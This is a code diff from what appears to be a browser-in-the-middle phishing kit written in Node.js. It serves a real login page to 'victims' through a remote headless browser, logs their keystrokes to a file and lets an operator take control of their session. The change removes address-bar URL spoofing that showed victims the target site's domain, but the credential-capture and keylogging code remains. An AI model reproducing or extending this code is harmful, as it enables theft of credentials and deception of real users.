@@ -290,7 +290,6 @@ async function get_browser(target_page){
   browser.victim_ip = ''
   browser.victim_target_id = ''
   browser.controller_socket = ''
-  browser.spoofed_domain = ''
   browser.keylog = ''
   browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
   browser.browser_id = browser_id
@@ -357,44 +356,11 @@ fastify.ready(async function(err){
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
       
-      // Extract target domain from the startup target's login_page URL for URL spoofing
-      const targetUrl = new URL(target.login_page)
-      empty_phishbowl.spoofed_domain = targetUrl.hostname
-      
-      console.log(`Using startup target: ${target.login_page}`)
-      console.log(`Target domain set to: ${empty_phishbowl.spoofed_domain}`)
-      
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
       await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
       empty_phishbowl.victim_socket = socket.id
       //start off this victim with control of the browser instance
       empty_phishbowl.controller_socket = socket.id
-      
-      // Set up framenavigated handler for this browser instance
-      empty_phishbowl.target_page.on('framenavigated', function(frame){
-        if(frame.parentFrame() === null) {
-          if(empty_phishbowl.controller_socket !== undefined){
-            // Get the real URL from the target site
-            const realUrl = new URL(frame.url())
-            
-            // Use the stored spoofed domain (target domain) from when the victim connected
-            const spoofedDomain = empty_phishbowl.spoofed_domain || 'localhost:58082'
-            
-            // Construct spoofed URL: use target domain with real path/params so victim sees expected domain
-            const spoofedUrl = `https://${spoofedDomain}${realUrl.pathname}${realUrl.search}${realUrl.hash}`
-            
-            console.log(`Navigation detected, spoofing URL to: ${spoofedUrl}`)
-            fastify.io.to(empty_phishbowl.controller_socket).emit('push_state', spoofedUrl)
-          }
-        }
-      })
-      
-      // Immediately spoof the URL with the current page
-      const targetPageUrl = new URL(target.login_page)
-      const initialSpoofedUrl = `https://${empty_phishbowl.spoofed_domain}${targetPageUrl.pathname}${targetPageUrl.search}${targetPageUrl.hash}`
-      
-      console.log(`Spoofing URL to: ${initialSpoofedUrl}`)
-      fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
       
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
